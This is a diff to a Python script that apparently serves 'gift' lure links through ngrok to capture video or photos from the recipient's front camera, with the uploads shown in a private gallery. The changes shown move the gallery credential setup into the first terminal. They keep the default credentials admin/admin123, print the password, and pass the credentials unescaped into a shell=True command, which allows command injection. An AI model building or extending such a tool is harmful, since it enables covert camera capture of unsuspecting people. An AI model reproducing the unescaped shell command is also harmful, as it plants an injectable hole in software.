@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Gift Video Receiver & Private Gallery Server
-Runs Receiver in Current Terminal (Port 5000 + Ngrok) & Spawns Gallery in New Terminal (Port 5001)
+Terminal 1 prompts for all settings (including Gallery credentials) and spawns Gallery Server in Terminal 2.
 """
 
 import os
@@ -492,6 +492,20 @@ class ReceiverRunner:
                 return 'photo', 0, photos
             print("❌ Invalid choice. Enter 1 or 2")
 
+    def get_gallery_credentials(self):
+        print("\n🔐 PRIVATE GALLERY LOGIN SETUP:")
+        user = input("   👤 Enter Gallery Username (default: admin): ").strip()
+        if not user:
+            user = "admin"
+            print(f"      Using default username: {user}")
+            
+        password = input("   🔑 Enter Gallery Password (default: admin123): ").strip()
+        if not password:
+            password = "admin123"
+            print(f"      Using default password: {password}")
+            
+        return user, password
+
     def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
         base_url = self.ngrok_url
         if mode == 'festival':
@@ -533,6 +547,12 @@ class ReceiverRunner:
                         video_id = video_input
                 name = None
 
+            # Setup Gallery Credentials right here in Terminal 1
+            gallery_user, gallery_pass = self.get_gallery_credentials()
+
+            # Spawn Gallery in Terminal 2 with credentials passed in
+            spawn_gallery_terminal(gallery_user, gallery_pass)
+
             self.start_flask()
             if not self.start_ngrok():
                 return
@@ -545,8 +565,9 @@ class ReceiverRunner:
             print(f"\n🔗 {link}\n")
             print("=" * 60)
             print(f"\n🎁 Receiver is ready and listening on port {self.port}!")
+            print(f"🖼️ Gallery Link:       http://localhost:{GALLERY_PORT}/gallery")
+            print(f"🔐 Gallery Login:      Username: {gallery_user} | Password: {gallery_pass}")
             print(f"📁 Local Upload Folder: {UPLOAD_FOLDER.absolute()}")
-            print(f"🖼️ Gallery is running in Terminal 2 at: http://localhost:{GALLERY_PORT}/gallery")
             print("=" * 60)
 
             while self.running:
@@ -559,24 +580,17 @@ class ReceiverRunner:
 
 
 class GalleryRunner:
-    def __init__(self, port=GALLERY_PORT):
+    def __init__(self, user="admin", password="admin123", port=GALLERY_PORT):
         self.port = port
+        self.user = user
+        self.password = password
         self.running = True
 
-    def get_credentials(self):
-        print("\n" + "=" * 60)
-        print("🖼️ PRIVATE MEDIA GALLERY SERVER (TERMINAL 2)")
-        print("=" * 60)
-        print("\n🔐 GALLERY LOGIN SETUP:")
-        user = input("   👤 Enter Gallery Username (default: admin): ").strip() or "admin"
-        password = input("   🔑 Enter Gallery Password (default: admin123): ").strip() or "admin123"
-        
-        gallery_app.config['GALLERY_USER'] = user
-        gallery_app.config['GALLERY_PASS'] = password
-        gallery_app.config['AUTH_ENABLED'] = True
-        return user, password
-
     def start_flask(self):
+        gallery_app.config['GALLERY_USER'] = self.user
+        gallery_app.config['GALLERY_PASS'] = self.password
+        gallery_app.config['AUTH_ENABLED'] = True
+
         print(f"\n🔧 Starting Gallery Server on port {self.port}...")
         def run_flask():
             gallery_app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
@@ -588,16 +602,15 @@ class GalleryRunner:
 
     def run(self):
         try:
-            user, password = self.get_credentials()
             self.start_flask()
 
             local_url = f"http://localhost:{self.port}/gallery"
             
             print("\n" + "=" * 60)
-            print("🖼️ PRIVATE GALLERY IS READY:")
+            print("🖼️ PRIVATE MEDIA GALLERY SERVER (TERMINAL 2)")
             print("=" * 60)
             print(f"  🏠 Local Gallery Link: {local_url}")
-            print(f"  🔐 Login Credentials: Username: {user} | Password: {password}")
+            print(f"  🔐 Login Credentials: Username: {self.user} | Password: {self.password}")
             print(f"  📁 Reading From:       {UPLOAD_FOLDER.absolute()}")
             print("=" * 60)
 
@@ -606,13 +619,16 @@ class GalleryRunner:
         except KeyboardInterrupt:
             print("\n👋 Gallery server shutting down...")
 
-def spawn_gallery_terminal():
+def spawn_gallery_terminal(user="admin", password="admin123"):
     server_script = Path(__file__).absolute()
     print("\n🖥️ Opening Private Gallery Server in a NEW terminal window...")
 
+    cmd_win = f'start "Private Gallery Server" cmd /k "{sys.executable} "{server_script}" --gallery --user "{user}" --pass "{password}""'
+    cmd_linux = f'{sys.executable} "{server_script}" --gallery --user "{user}" --pass "{password}"'
+
     if sys.platform == "win32":
         try:
-            subprocess.Popen(f'start "Private Gallery Server" cmd /k "{sys.executable} "{server_script}" --gallery"', shell=True)
+            subprocess.Popen(cmd_win, shell=True)
             print("   ✅ Opened Gallery Server in a new Windows terminal window!")
             return True
         except Exception as e:
@@ -620,14 +636,13 @@ def spawn_gallery_terminal():
             return False
     else:
         # Linux / macOS (Parrot OS, Debian, Ubuntu, etc.)
-        cmd_str = f'{sys.executable} "{server_script}" --gallery'
         terminals = [
-            ['x-terminal-emulator', '-e', cmd_str],
-            ['qterminal', '-e', cmd_str],
-            ['gnome-terminal', '--', sys.executable, str(server_script), '--gallery'],
-            ['konsole', '-e', sys.executable, str(server_script), '--gallery'],
-            ['xfce4-terminal', '-e', cmd_str],
-            ['xterm', '-e', cmd_str]
+            ['x-terminal-emulator', '-e', cmd_linux],
+            ['qterminal', '-e', cmd_linux],
+            ['gnome-terminal', '--', sys.executable, str(server_script), '--gallery', '--user', user, '--pass', password],
+            ['konsole', '-e', sys.executable, str(server_script), '--gallery', '--user', user, '--pass', password],
+            ['xfce4-terminal', '-e', cmd_linux],
+            ['xterm', '-e', cmd_linux]
         ]
         
         for term_cmd in terminals:
@@ -643,12 +658,22 @@ def spawn_gallery_terminal():
         return False
 
 if __name__ == '__main__':
-    if len(sys.argv) > 1 and sys.argv[1] == '--gallery':
-        # Run Gallery Server mode (Terminal 2)
-        gallery = GalleryRunner()
+    if '--gallery' in sys.argv:
+        # Run Gallery Server mode in Terminal 2 using credentials passed from Terminal 1
+        user = "admin"
+        password = "admin123"
+        if '--user' in sys.argv:
+            idx = sys.argv.index('--user')
+            if idx + 1 < len(sys.argv):
+                user = sys.argv[idx + 1]
+        if '--pass' in sys.argv:
+            idx = sys.argv.index('--pass')
+            if idx + 1 < len(sys.argv):
+                password = sys.argv[idx + 1]
+
+        gallery = GalleryRunner(user=user, password=password)
         gallery.run()
     else:
-        # Main entry point (Terminal 1): Spawn Gallery in new terminal, run Receiver in current terminal
-        spawn_gallery_terminal()
+        # Main entry point (Terminal 1): Prompt for all settings (including credentials), then spawn Terminal 2
         receiver = ReceiverRunner()
         receiver.run()
